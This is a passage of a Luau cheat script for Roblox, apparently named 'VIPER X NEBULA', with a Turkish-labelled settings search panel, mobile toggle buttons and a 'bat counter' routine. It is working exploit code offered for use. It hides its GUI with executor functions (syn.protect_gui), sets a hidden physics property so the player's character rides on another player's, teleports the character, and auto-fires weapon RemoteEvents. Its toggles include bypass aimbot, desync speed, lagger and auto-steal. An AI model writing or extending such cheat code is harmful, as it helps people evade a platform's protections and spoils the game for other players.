                        end
                    end
                end
            end
        end
        local results = {}
        for _, item in pairs(resultsByRoot) do table.insert(results, item) end
        table.sort(results, function(a, b)
            if a.score == b.score then
                if a.pageName == b.pageName then return a.label:lower() < b.label:lower() end
                return a.pageName < b.pageName
            end
            return a.score > b.score
        end)
        local maxResults = tonumber(limit) or 24
        while #results > maxResults do table.remove(results) end
        return results
    end

    local function flashSearchTarget(target)
        if not target or not target.Parent then return end
        local flash = Instance.new("UIStroke")
        flash.Name = "VIPERSearchFlashOnce"
        flash.Color = Color3.fromRGB(255, 135, 32)
        flash.Thickness = 3
        flash.Transparency = 0
        flash.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        flash.Parent = target
        task.delay(0.12, function()
            if flash and flash.Parent then
                TS:Create(flash, TweenInfo.new(0.58, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    Transparency = 1,
                    Thickness = 1,
                }):Play()
            end
        end)
        task.delay(0.78, function()
            if flash and flash.Parent then flash:Destroy() end
        end)
    end

    local function jumpToSearchTarget(target)
        if not target or not target.page then return false end
        -- Use the real tab/page instances, rather than simulating a click on an invisible button.
        for _, page in pairs(contentPages) do
            if page ~= target.page then
                page.Visible = false
                page.Position = UDim2.new(0, 0, 0, 0)
            end
        end
        target.page.Visible = true
        target.page.Position = UDim2.new(0, 9, 0, 0)
        TS:Create(target.page, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            Position = UDim2.new(0, 0, 0, 0)
        }):Play()

        local pageIndex = table.find(tabs, target.pageName)
        for index, button in ipairs(tabButtons) do
            local underline = button:FindFirstChild("Underline")
            local stroke = button:FindFirstChild("TabStroke")
            if index == pageIndex then
                if underline then
                    underline.Visible = true
                    underline.Size = UDim2.new(0, 0, 0, 3)
                    TS:Create(underline, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                        Size = UDim2.new(0, 34, 0, 3)
                    }):Play()
                end
                TS:Create(button, TweenInfo.new(0.18, Enum.EasingStyle.Quint), {
                    BackgroundTransparency = 0.15,
                    BackgroundColor3 = getThemeColor(),
                    TextColor3 = Color3.fromRGB(245, 245, 255)
                }):Play()
                if stroke then TS:Create(stroke, TweenInfo.new(0.18), {Transparency = 0.3}):Play() end
            else
                if underline then underline.Visible = false end
                TS:Create(button, TweenInfo.new(0.18, Enum.EasingStyle.Quint), {
                    BackgroundTransparency = 1,
                    BackgroundColor3 = Color3.fromRGB(26, 26, 34),
                    TextColor3 = Color3.fromRGB(115, 120, 140)
                }):Play()
                if stroke then TS:Create(stroke, TweenInfo.new(0.18), {Transparency = 1}):Play() end
            end
        end

        task.wait(0.28)
        if target.page.Parent then
            local root = target.root
            if root and root.Parent then
                local offsetY = root.AbsolutePosition.Y - target.page.AbsolutePosition.Y + target.page.CanvasPosition.Y - 28
                target.page.CanvasPosition = Vector2.new(target.page.CanvasPosition.X, math.max(0, offsetY))
                flashSearchTarget(root)
            elseif target.object and target.object.Parent then
                flashSearchTarget(target.object)
            end
        end
        return true
    end

    local searchGui, searchPanel, searchInput, searchResults, searchCountLabel

    local function closeVIPERSearch()
        if searchGui and searchGui.Parent then searchGui:Destroy() end
        searchGui, searchPanel, searchInput, searchResults, searchCountLabel = nil, nil, nil, nil, nil
    end

    local function makeSearchResultButton(item, order)
        local button = Instance.new("TextButton")
        button.Name = "SearchResult_" .. tostring(order)
        button.Size = UDim2.new(1, -8, 0, 52)
        button.BackgroundColor3 = Color3.fromRGB(13, 13, 16)
        button.BorderSizePixel = 0
        button.Text = ""
        button.AutoButtonColor = false
        button.LayoutOrder = order
        button.ZIndex = 1014
        button.Parent = searchResults
        Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
        local stroke = Instance.new("UIStroke", button)
        stroke.Color = Color3.fromRGB(52, 52, 60)
        stroke.Thickness = 1
        stroke.Transparency = 0.18

        local nameLabel = Instance.new("TextLabel", button)
        nameLabel.Name = "ResultName"
        nameLabel.Position = UDim2.new(0, 11, 0, 5)
        nameLabel.Size = UDim2.new(1, -100, 0, 23)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Text = tostring(item.label):sub(1, 100)
        nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        nameLabel.Font = Enum.Font.GothamSemibold
        nameLabel.TextSize = 12
        nameLabel.TextXAlignment = Enum.TextXAlignment.Left
        nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
        nameLabel.ZIndex = 1015

        local pageLabel = Instance.new("TextLabel", button)
        pageLabel.Name = "ResultTab"
        pageLabel.Position = UDim2.new(0, 11, 0, 28)
        pageLabel.Size = UDim2.new(1, -18, 0, 15)
        pageLabel.BackgroundTransparency = 1
        pageLabel.Text = string.upper(tostring(item.pageName)) .. "  •  Açmak için tıkla"
        pageLabel.TextColor3 = Color3.fromRGB(255, 139, 54)
        pageLabel.Font = Enum.Font.GothamMedium
        pageLabel.TextSize = 9
        pageLabel.TextXAlignment = Enum.TextXAlignment.Left
        pageLabel.TextTruncate = Enum.TextTruncate.AtEnd
        pageLabel.ZIndex = 1015

        button.MouseEnter:Connect(function()
            if stroke and stroke.Parent then
                TS:Create(stroke, TweenInfo.new(0.12), {Color = Color3.fromRGB(255, 110, 20), Transparency = 0}):Play()
            end
            TS:Create(button, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(24, 19, 17)}):Play()
        end)
        button.MouseLeave:Connect(function()
            if stroke and stroke.Parent then
                TS:Create(stroke, TweenInfo.new(0.12), {Color = Color3.fromRGB(52, 52, 60), Transparency = 0.18}):Play()
            end
            TS:Create(button, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(13, 13, 16)}):Play()
        end)
        button.Activated:Connect(function()
            local ok = pcall(function() jumpToSearchTarget(item) end)
            if ok then closeVIPERSearch() end
        end)
        return button
    end

    local function refreshVIPERSearch(query)
        if not searchResults or not searchResults.Parent then return end
        for _, child in ipairs(searchResults:GetChildren()) do
            if child ~= searchResults:FindFirstChildOfClass("UIListLayout") and child:IsA("GuiObject") then
                child:Destroy()
            end
        end
        query = tostring(query or ""):gsub("^%s+", ""):gsub("%s+$", "")
        if query == "" then
            if searchCountLabel then searchCountLabel.Text = "Bir ayar ara  •  Örn. Bypass Aimbot, UI Scale, Background" end
            return
        end
        local matches = findSearchTargets(query, 30)
        if searchCountLabel then
            searchCountLabel.Text = tostring(#matches) .. " sonuç bulundu"
        end
        if #matches == 0 then
            local empty = Instance.new("TextLabel", searchResults)
            empty.Name = "NoResults"
            empty.Size = UDim2.new(1, -8, 0, 58)
            empty.BackgroundTransparency = 1
            empty.Text = "Eşleşme yok. Farklı bir kelime dene."
            empty.TextColor3 = Color3.fromRGB(185, 185, 195)
            empty.Font = Enum.Font.Gotham
            empty.TextSize = 12
            empty.TextWrapped = true
            empty.LayoutOrder = 1
            empty.ZIndex = 1014
            return
        end
        for index, item in ipairs(matches) do makeSearchResultButton(item, index) end
    end

    openVIPERSearch = function()
        if searchGui and searchGui.Parent then
            if searchInput then searchInput:CaptureFocus() end
            return
        end
        local screen = Instance.new("ScreenGui")
        searchGui = screen
        screen.Name = "VIPER_Search_Panel"
        screen.ResetOnSpawn = false
        screen.IgnoreGuiInset = true
        screen.DisplayOrder = 1000
        screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        pcall(function() if syn and syn.protect_gui then syn.protect_gui(screen) end end)
        local searchParentOk = pcall(function()
            screen.Parent = (gui and gui.Parent) or pgui
        end)
        if not searchParentOk then screen.Parent = pgui end

        local viewport = Workspace.CurrentCamera and Workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
        local isSmallScreen = viewport.X < 700
        local backdrop = Instance.new("TextButton", screen)
        backdrop.Name = "Backdrop"
        backdrop.Size = UDim2.fromScale(1, 1)
        backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        backdrop.BackgroundTransparency = 0.42
        backdrop.BorderSizePixel = 0
        backdrop.Text = ""
        backdrop.AutoButtonColor = false
        backdrop.ZIndex = 1000
        backdrop.Activated:Connect(closeVIPERSearch)

        local panel = Instance.new("Frame", screen)
        searchPanel = panel
        panel.Name = "SearchWindow"
        panel.AnchorPoint = Vector2.new(0.5, 0.5)
        panel.Size = isSmallScreen and UDim2.new(0.92, 0, 0.78, 0) or UDim2.fromOffset(440, 500)
        panel.Position = UDim2.new(0.5, 0, 0.53, 0)
        panel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        panel.BorderSizePixel = 0
        panel.Active = true
        panel.ZIndex = 1001
        Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 14)
        local panelStroke = Instance.new("UIStroke", panel)
        panelStroke.Color = Color3.fromRGB(255, 110, 20)
        panelStroke.Thickness = 1.5
        panelStroke.Transparency = 0.08
        local scale = Instance.new("UIScale", panel)
        scale.Scale = 0.92
        TS:Create(scale, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()

        local header = Instance.new("Frame", panel)
        header.Name = "SearchHeader"
        header.Size = UDim2.new(1, -2, 0, 54)
        header.Position = UDim2.new(0, 1, 0, 1)
        header.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
        header.BorderSizePixel = 0
        header.ZIndex = 1002
        Instance.new("UICorner", header).CornerRadius = UDim.new(0, 13)

        local title = Instance.new("TextLabel", header)
        title.BackgroundTransparency = 1
        title.Position = UDim2.new(0, 14, 0, 0)
        title.Size = UDim2.new(1, -60, 1, 0)
        title.Text = "⌕  SEARCH VIPER X NEBULA"
        title.TextColor3 = Color3.fromRGB(255, 255, 255)
        title.Font = Enum.Font.GothamBlack
        title.TextSize = 15
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.ZIndex = 1003

        local close = Instance.new("TextButton", header)
        close.Name = "CloseSearch"
        close.AnchorPoint = Vector2.new(1, 0.5)
        close.Position = UDim2.new(1, -10, 0.5, 0)
        close.Size = UDim2.fromOffset(30, 30)
        close.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        close.BorderSizePixel = 0
        close.Text = "×"
        close.TextColor3 = Color3.fromRGB(255, 255, 255)
        close.Font = Enum.Font.GothamBold
        close.TextSize = 20
        close.ZIndex = 1004
        Instance.new("UICorner", close).CornerRadius = UDim.new(0, 8)
        close.Activated:Connect(closeVIPERSearch)

        local input = Instance.new("TextBox", panel)
        searchInput = input
        input.Name = "SearchInput"
        input.Position = UDim2.new(0, 12, 0, 66)
        input.Size = UDim2.new(1, -24, 0, 40)
        input.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
        input.BorderSizePixel = 0
        input.ClearTextOnFocus = false
        input.PlaceholderText = "Ayar ara... ör. Bypass Aimbot, UI Scale"
        input.PlaceholderColor3 = Color3.fromRGB(145, 145, 155)
        input.Text = ""
        input.TextColor3 = Color3.fromRGB(255, 255, 255)
        input.Font = Enum.Font.Gotham
        input.TextSize = 12
        input.TextXAlignment = Enum.TextXAlignment.Left
        input.ZIndex = 1003
        Instance.new("UICorner", input).CornerRadius = UDim.new(0, 8)
        local inputPadding = Instance.new("UIPadding", input)
        inputPadding.PaddingLeft = UDim.new(0, 10)
        inputPadding.PaddingRight = UDim.new(0, 8)
        local inputStroke = Instance.new("UIStroke", input)
        inputStroke.Color = Color3.fromRGB(70, 70, 78)
        inputStroke.Thickness = 1
        inputStroke.Transparency = 0.35

        local count = Instance.new("TextLabel", panel)
        searchCountLabel = count
        count.Name = "SearchCount"
        count.Position = UDim2.new(0, 14, 0, 112)
        count.Size = UDim2.new(1, -28, 0, 24)
        count.BackgroundTransparency = 1
        count.Text = "Bir ayar ara  •  Örn. Bypass Aimbot, UI Scale, Background"
        count.TextColor3 = Color3.fromRGB(170, 170, 180)
        count.Font = Enum.Font.GothamMedium
        count.TextSize = 10
        count.TextXAlignment = Enum.TextXAlignment.Left
        count.TextTruncate = Enum.TextTruncate.AtEnd
        count.ZIndex = 1003

        local results = Instance.new("ScrollingFrame", panel)
        searchResults = results
        results.Name = "SearchResults"
        results.Position = UDim2.new(0, 10, 0, 140)
        results.Size = UDim2.new(1, -20, 1, -150)
        results.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
        results.BackgroundTransparency = 0
        results.BorderSizePixel = 0
        results.ScrollBarThickness = 3
        results.ScrollBarImageColor3 = Color3.fromRGB(255, 110, 20)
        results.AutomaticCanvasSize = Enum.AutomaticSize.Y
        results.CanvasSize = UDim2.new(0, 0, 0, 0)
        results.ZIndex = 1002
        Instance.new("UICorner", results).CornerRadius = UDim.new(0, 9)
        local resultPadding = Instance.new("UIPadding", results)
        resultPadding.PaddingTop = UDim.new(0, 6)
        resultPadding.PaddingBottom = UDim.new(0, 6)
        resultPadding.PaddingLeft = UDim.new(0, 4)
        resultPadding.PaddingRight = UDim.new(0, 4)
        local resultLayout = Instance.new("UIListLayout", results)
        resultLayout.Padding = UDim.new(0, 6)
        resultLayout.SortOrder = Enum.SortOrder.LayoutOrder

        input:GetPropertyChangedSignal("Text"):Connect(function()
            refreshVIPERSearch(input.Text)
        end)
        input.FocusLost:Connect(function(enterPressed)
            if enterPressed then
                local matches = findSearchTargets(input.Text, 1)
                if matches[1] then
                    pcall(function() jumpToSearchTarget(matches[1]) end)
                    closeVIPERSearch()
                end
            end
        end)
        refreshVIPERSearch("")
        task.defer(function()
            if searchInput and searchInput.Parent then searchInput:CaptureFocus() end
        end)
    end

end
function createMobilePanel()
    local panel = Instance.new("ScreenGui")
    panel.Name = "ViperMobilePanel"
    panel.ResetOnSpawn = false
    panel.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    panel.Enabled = CONFIG.SHOW_MOBILE_BUTTONS
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(panel) end end)
    local okPanel = pcall(function() panel.Parent = game:GetService("CoreGui") end)
    if not okPanel then panel.Parent = LP:WaitForChild("PlayerGui") end

    local BTN_W, BTN_H = 60, 60
    local buttons = {}
    local buttonNames = {"DropBR", "AutoLeft", "AutoBat", "BypassAim", "AutoRight", "TpDown", "Carry", "Lagger1", "Lagger2", "DesyncSpd"}
    local buttonTexts = {"DROP\nBR", "AUTO\nLEFT", "BAT\nAIMBOT", "BYPASS\nAIM", "AUTO\nRIGHT", "TP\nDOWN", "CARRY\nSPD", "LAGGER\nNORMAL", "LAGGER\nCARRY", "DESYNC\nSPEED"}

    local function createButton(name, text, order, isToggle, callback)
        local btn = Instance.new("TextButton", panel)
        btn.Name = name
        btn.Size = UDim2.new(0, BTN_W, 0, BTN_H)
        btn.BackgroundColor3 = Color3.fromRGB(10,10,10)
        btn.BorderSizePixel = 0
        btn.Text = ""
        btn.AutoButtonColor = false
        btn.ZIndex = 10

        local savedPos = savedButtonPositions[name]
        if savedPos then
            btn.Position = UDim2.new(0, savedPos.X or 0, 0, savedPos.Y or 0)
        else
            local defX, defY = getDefaultButtonPosition(name)
            btn.Position = UDim2.new(0, defX, 0, defY)
        end

        btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        btn.BackgroundTransparency = 0.05
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

        local stroke = Instance.new("UIStroke", btn)
        stroke.Color = Color3.fromRGB(255, 110, 20)
        stroke.Thickness = 1.2
        stroke.Transparency = 0.4
        stroke.Name = "NormalStroke"

        local label = Instance.new("TextLabel", btn)
        label.Name = "TextLabel"
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.Font = Enum.Font.GothamBlack
        label.TextSize = 11
        label.TextWrapped = true
        label.ZIndex = 11

        local uiScale = Instance.new("UIScale", btn)
        uiScale.Scale = floatingButtonScale
        table.insert(_floatingUIScales, uiScale)

        local active = false
        local function setActive(state)
            active = state
            btn:SetAttribute("MobActive", state and true or false)
            paintFloatingBtn(btn, state)
        end
        setActive(false)

        local dragging = false
        local hasMoved = false
        local dragStart = nil
        local startPos = nil
        local movedDistance = 0

        local function onInputBegan(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true; hasMoved = false; movedDistance = 0
                dragStart = input.Position; startPos = btn.Position
                _isDraggingButton = true
            end
        end

        local function onInputChanged(input)
            if not dragging then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local delta = input.Position - dragStart
                movedDistance = delta.Magnitude
                if not uiLocked and not mobileButtonsLocked then
                    if movedDistance >= 3 then hasMoved = true end
                    btn.Position = UDim2.new(0, startPos.X.Offset + delta.X, 0, startPos.Y.Offset + delta.Y)
                end
            end
        end

        local function onInputEnded(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                if dragging then
                    if movedDistance < 12 and not hasMoved then
                        if isToggle then
                            if callback then callback(setActive) end
                        else
                            if callback then callback(setActive, active) end
                        end
                        -- Mobile shortcuts can modify persisted settings as well.
                        task.defer(function() pcall(saveAllSettings) end)
                    elseif not uiLocked and not mobileButtonsLocked and hasMoved then
                        savedButtonPositions[name] = {X = btn.Position.X.Offset, Y = btn.Position.Y.Offset}
                        task.defer(function() pcall(saveAllSettings, true) end)
                    end
                    dragging = false; hasMoved = false
                    dragStart = nil; startPos = nil; movedDistance = 0
                    _isDraggingButton = false
                end
            end
        end

        btn.InputBegan:Connect(onInputBegan)
        btn.InputChanged:Connect(onInputChanged)
        btn.InputEnded:Connect(onInputEnded)

        UIS.InputEnded:Connect(function(inp)
            if inp.UserInputType ~= Enum.UserInputType.Touch
               and inp.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
            if dragging then onInputEnded(inp) end
        end)

        if hiddenMobileButtons[name] then
            btn.Visible = false
        end
        buttons[name] = {btn = btn, setActive = setActive, label = label}
        return setActive
    end

    for i, name in ipairs(buttonNames) do
        local text = buttonTexts[i]
        local callback
        if name == "DropBR" then
            callback = function(setActive)
                if autoBatEnabled then return end
                setActive(true)
                executeDropWithToggle(function(v)
                    if dropBrainrotSetVisual then dropBrainrotSetVisual(v) end
                end)
                task.delay(0.3, function() setActive(false) end)
            end
        elseif name == "AutoLeft" then
            callback = function(setActive)
                autoLeftEnabled = not autoLeftEnabled
                setActive(autoLeftEnabled)
                if autoLeftEnabled then startAutoLeft() else stopAutoLeft() end
                if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
            end
        elseif name == "AutoBat" then
            callback = function(setActive)
                if not autoBatEnabled then enableAutoBat() else disableAutoBat() end
                setActive(autoBatEnabled)
            end
        elseif name == "BypassAim" then
            callback = function(setActive)
                if bypassAimbotEnabled then
                    disableBypassAimbot()
                    setActive(false)
                else
                    enableBypassAimbot()
                    setActive(bypassAimbotEnabled)
                end
            end
        elseif name == "AutoRight" then
            callback = function(setActive)
                autoRightEnabled = not autoRightEnabled
                setActive(autoRightEnabled)
                if autoRightEnabled then startAutoRight() else stopAutoRight() end
                if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
            end
        elseif name == "TpDown" then
            callback = function(setActive)
                doTpDown()
                setActive(true)
                task.delay(0.2, function() setActive(false) end)
            end
        elseif name == "Carry" then
            callback = function(setActive)
                if not speedMode then
                    speedMode = true; laggerToggled = false; laggerCarryToggled = false; setActive(true)
                    if buttons.Lagger1 and buttons.Lagger1.setActive then buttons.Lagger1.setActive(false) end
                    if buttons.Lagger2 and buttons.Lagger2.setActive then buttons.Lagger2.setActive(false) end
                else
                    speedMode = false; setActive(false)
                end
                refreshSpeedModeLabel()
                if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
            end
        elseif name == "Lagger1" then
            callback = function(setActive)
                if speedMode then speedMode = false; if mobSetCarry then mobSetCarry(false) end end
                if not laggerToggled then
                    laggerToggled = true; laggerCarryToggled = false; setActive(true)
                    if buttons.Lagger2 and buttons.Lagger2.setActive then buttons.Lagger2.setActive(false) end
                else
                    laggerToggled = false; setActive(false)
                end
                refreshSpeedModeLabel()
                if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
            end
        elseif name == "Lagger2" then
            callback = function(setActive)
                if speedMode then speedMode = false; if mobSetCarry then mobSetCarry(false) end end
                if not laggerCarryToggled then
                    laggerCarryToggled = true; laggerToggled = false; setActive(true)
                    if buttons.Lagger1 and buttons.Lagger1.setActive then buttons.Lagger1.setActive(false) end
                else
                    laggerToggled = false; setActive(false)
                end
                refreshSpeedModeLabel()
                if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
            end
        elseif name == "DesyncSpd" then
            callback = function(setActive)
                toggleDesyncSpeedMode()
                setActive(desyncSpeedToggled)
            end
        end
        local setActive = createButton(name, text, i-1, true, callback)
        if name == "AutoBat" then mobSetAutoBat = setActive end
        if name == "AutoLeft" then mobSetAutoLeft = setActive end
        if name == "AutoRight" then mobSetAutoRight = setActive end
        if name == "DropBR" then mobSetDropBR = setActive end
        if name == "TpDown" then mobSetTpDown = setActive end
        if name == "Carry" then mobSetCarry = setActive end
        if name == "Lagger1" then mobSetLagger1 = setActive end
        if name == "Lagger2" then mobSetLagger2 = setActive end
        if name == "DesyncSpd" then mobSetDesyncSpd = setActive end
    end

    if buttons.AutoBat and buttons.AutoBat.setActive then buttons.AutoBat.setActive(autoBatEnabled) end
    if buttons.AutoLeft and buttons.AutoLeft.setActive then buttons.AutoLeft.setActive(autoLeftEnabled) end
    if buttons.AutoRight and buttons.AutoRight.setActive then buttons.AutoRight.setActive(autoRightEnabled) end
    if buttons.Carry and buttons.Carry.setActive then buttons.Carry.setActive(speedMode) end
    if buttons.Lagger1 and buttons.Lagger1.setActive then buttons.Lagger1.setActive(laggerToggled) end
    if buttons.Lagger2 and buttons.Lagger2.setActive then buttons.Lagger2.setActive(laggerCarryToggled) end
    if buttons.DesyncSpd and buttons.DesyncSpd.setActive then buttons.DesyncSpd.setActive(desyncSpeedToggled or desyncCarryToggled) end

    return panel
end



batCounterV2Enabled = false
batCounterV2Debounce = false
batCounterV2Conn = nil
batCounterV2HitCooldown = false
BAT_COUNTER_V2_SWING_CD = 0.08
setBatCounterV2Visual = nil

local _batCounterV2OriginalTpState = false
local _batCounterV2SuppressCount = 0
local _lastBatCounterV2Time = 0
local _batCounterV2Cooldown = 0.01

function isPlayerRagdolled(player)
    if not player or not player.Character then return false end
    local hum = player.Character:FindFirstChildOfClass("Humanoid")
    if not hum then return false end
    local state = hum:GetState()
    return state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
end

function hasAnimalEquipped(player)
    if not player or not player.Character then return false end
    for _, child in ipairs(player.Character:GetChildren()) do
        if child:IsA("Tool") then
            if child:FindFirstChild("Handle") or child.Name:find("Animal") or child.Name:find("Pet") then return true end
        end
    end
    return false
end

function getAttackingPlayerWithAnimal()
    local myChar = LP.Character
    if not myChar then return nil end
    local myRoot = myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return nil end
    local closest, minDist = nil, _huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character then
            if not hasAnimalEquipped(plr) then continue end
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - myRoot.Position).Magnitude
                if dist < 12 and dist < minDist then
                    minDist = dist; closest = plr
                end
            end
        end
    end
    return closest
end

function getBatV2Counter()
    local char = LP.Character
    if not char then return nil end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Tool") then
            local name = child.Name:lower()
            if name:find("bat") or name:find("slap") or name:find("sword") or name:find("knife") then return child end
        end
    end
    local bp = LP:FindFirstChild("Backpack")
    if bp then
        for _, child in ipairs(bp:GetChildren()) do
            if child:IsA("Tool") then
                local name = child.Name:lower()
                if name:find("bat") or name:find("slap") or name:find("sword") or name:find("knife") then
                    child.Parent = char
                    return child
                end
            end
        end
    end
    if bp then
        for _, child in ipairs(bp:GetChildren()) do
            if child:IsA("Tool") then child.Parent = char; return child end
        end
    end
    return nil
end

function tryHitBatCounterV2()
    if batCounterV2HitCooldown then return end
    batCounterV2HitCooldown = true
    pcall(function()
        local bat = getBatV2Counter()
        if bat then
            bat:Activate()
            local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
            if ev then ev:FireServer() end
        end
    end)
    task.delay(BAT_COUNTER_V2_SWING_CD, function() batCounterV2HitCooldown = false end)
end

function executeBatCounterV2()
    local now = _tick()
    if now - (_lastBatCounterV2Time or 0) < (_batCounterV2Cooldown or 0.01) then return end
    if batCounterV2Debounce then return end
    batCounterV2Debounce = true
    _lastBatCounterV2Time = now
    local attacker = getAttackingPlayerWithAnimal()
    if not attacker then batCounterV2Debounce = false; return end
    if isPlayerRagdolled(attacker) then batCounterV2Debounce = false; return end
    if not hasAnimalEquipped(attacker) then batCounterV2Debounce = false; return end
    _batCounterV2OriginalTpState = batDesyncTpEnabled
    local tpWasEnabled = batDesyncTpEnabled
    if not tpWasEnabled then
        startBatDesyncTp()
        if batDesyncTpSetVisual then batDesyncTpSetVisual(true) end
    end
    local function doCounterHit()
        local char = LP.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local attChar = attacker.Character
        if not attChar then return end
        local attRoot = attChar:FindFirstChild("HumanoidRootPart")
        if not attRoot then return end
        if not hasAnimalEquipped(attacker) then batCounterV2Debounce = false; return end
        if sethiddenproperty then sethiddenproperty(hrp, "PhysicsRepRootPart", attRoot) end
        local targetPos = attRoot.Position + _V3new(0, 0.9, 0)
        if (hrp.Position - targetPos).Magnitude > 8 then hrp.CFrame = _CFnew(targetPos) end
        tryHitBatCounterV2()
        task.delay(0.05, function() tryHitBatCounterV2() end)
        task.delay(0.1, function() tryHitBatCounterV2() end)
    end
    doCounterHit()
    task.delay(0.2, function()
        if not _batCounterV2OriginalTpState and batDesyncTpEnabled then
            stopBatDesyncTp()
            if batDesyncTpSetVisual then batDesyncTpSetVisual(false) end
        end
        batCounterV2Debounce = false
    end)
end

function stopBatCounterV2()
    if batCounterV2Conn then
        batCounterV2Conn:Disconnect()
        batCounterV2Conn = nil
    end
    batCounterV2Debounce = false
    batCounterV2HitCooldown = false
end

function startBatCounterV2()
    if batCounterV2Conn then return end
    batCounterV2Conn = RunService.Heartbeat:Connect(function()
        if not batCounterV2Enabled then return end
        if batCounterV2Debounce then return end
        local character = LP.Character
        if not character then return end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid or humanoid.Health <= 0 then return end
        local state = humanoid:GetState()
        local isBeingAttacked = state == Enum.HumanoidStateType.Physics or
                               state == Enum.HumanoidStateType.Ragdoll or
                               state == Enum.HumanoidStateType.FallingDown or
                               state == Enum.HumanoidStateType.GettingUp or
                               state == Enum.HumanoidStateType.Stunned
        if isBeingAttacked then
            local attacker = getAttackingPlayerWithAnimal()
            if attacker then
                if not isPlayerRagdolled(attacker) then
                    if hasAnimalEquipped(attacker) then
                        executeBatCounterV2()
                    end
                end
            end
        end
    end)
end

function toggleBatCounterV2()
    batCounterV2Enabled = not batCounterV2Enabled
    if batCounterV2Enabled then startBatCounterV2() else stopBatCounterV2() end
    return batCounterV2Enabled
end

function updateUIFromLoaded()
    task.wait()
    if normalBox then normalBox.Text = tostring(NS) end
    if carryBox then carryBox.Text = tostring(CS) end
    if radInput then radInput.Text = tostring(CONFIG.STEAL_RANGE) end
    if laggerBox then laggerBox.Text = tostring(LAGGER_SPEED) end
    if lagger2Box then lagger2Box.Text = tostring(LAGGER_CARRY_SPEED) end
    if batSpeedBox then batSpeedBox.Text = tostring(BAT_AIMBOT_SPEED) end
    if uiScaleBox then uiScaleBox.Text = tostring(uiScaleValue) end
    if dropModeBtnRef then dropModeBtnRef.Text = dropMode == 1 and "Fling" or "Jump Drop" end
    if aimbotModeBtnRef then aimbotModeBtnRef.Text = selectedAimbotMode or "V1" end
    if bodyLockRangeBox then bodyLockRangeBox.Text = tostring(bodyLockRange) end
    refreshSpeedModeLabel()

    for _, ref in ipairs(keyButtonRefs) do
        local entry = ref.entry
        local label = (entry.gp and entry.gp.Name) or (entry.kb and entry.kb.Name) or "None"
        ref.btn.Text = label
    end

    if savedProgressBarPos and pbFrame then
        pbFrame.Position = UDim2.new(savedProgressBarPos.XScale or 0.5, savedProgressBarPos.XOffset or -160, savedProgressBarPos.YScale or 0.80, savedProgressBarPos.YOffset or 0)
    end

    applyBackgroundMode(backgroundMode)
    applyFloatingButtonScale()
    if type(_G.__VIPER_REFRESH_DRAWING_CUSTOM_SHAPE) == "function" then
        pcall(_G.__VIPER_REFRESH_DRAWING_CUSTOM_SHAPE)
    end

    if uiLocked and setLockUIVisual then setLockUIVisual(true) end

    if antiRagdollMode == "v2" then
        if setAntiRagVisual then setAntiRagVisual(true) end
        startAntiRagdollV2()
    else
        if setAntiRagVisual then setAntiRagVisual(false) end
    end

    if antiDieEnabled then
        if setAntiDieVisual then setAntiDieVisual(true) end
        AntiDieModule.start()
    else
        if setAntiDieVisual then setAntiDieVisual(false) end
    end

    if antiBatEnabled then
        if setAntiBatVisual then setAntiBatVisual(true) end
        startAntiBat()
    else
        if setAntiBatVisual then setAntiBatVisual(false) end
    end

    if antiFlingEnabled then
        if setAntiFlingVisual then setAntiFlingVisual(true) end
        startAntiFling()
    else
        if setAntiFlingVisual then setAntiFlingVisual(false) end
        stopAntiFling()
    end

    if CONFIG.AUTO_STEAL_ENABLED and setInstaGrab then setInstaGrab(true); pcall(startAutoSteal) end

    if medusaCounterEnabled then
        if setMedusaVisual then setMedusaVisual(true) end
        if LP.Character then setupMedusaCounter(LP.Character) end
    else
